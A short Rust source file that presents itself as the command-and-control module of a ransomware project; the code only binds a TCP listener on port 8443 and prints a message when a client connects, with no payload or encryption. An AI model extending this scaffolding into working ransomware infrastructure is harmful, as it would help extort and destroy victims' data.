// nail is the c2 module for the tetanus cryptolocker malware
const DBUG: i32 = 1;

extern crate std;
extern crate local_ip;

use std::io;
use std::env;
use std::net::{TcpListener, TcpStream};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

pub fn init() {
    if DBUG == 1 {
        println!("nail module initialized!");
    }

    let c2_port = ":8443";                          // set the port the server listens on
    let c2_addr = get_ip().to_string();             // get the local ip address to listen on

    let mut addr_string = "".to_string();           // placeholder empty string
    addr_string.push_str(&c2_addr);                 // push the ip address to the string
    addr_string.push_str(&c2_port);                 // push the port to the string

    // bind the c2 listner address
    let c2_lsnr = TcpListener::bind(&*addr_string).unwrap();
    if DBUG == 1 {
        println!("c2 server bound to: {}", addr_string);
    }

    // manage the streams
    for stream in c2_lsnr.incoming() {
        match stream {
            Ok(stream) => {
                // pass the stream to the client handler
                handle_client(stream);
            }
            Err(e) => {
                // connection failed
                println!("Connection failed! {}", e);
            }
        }
    }
}

fn get_ip() -> std::net::IpAddr  {
// returns the local ip address of the host
    let default = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
    local_ip::get().unwrap_or(default)
}

fn handle_client(stream: TcpStream) {
    println!("client connected!");
}
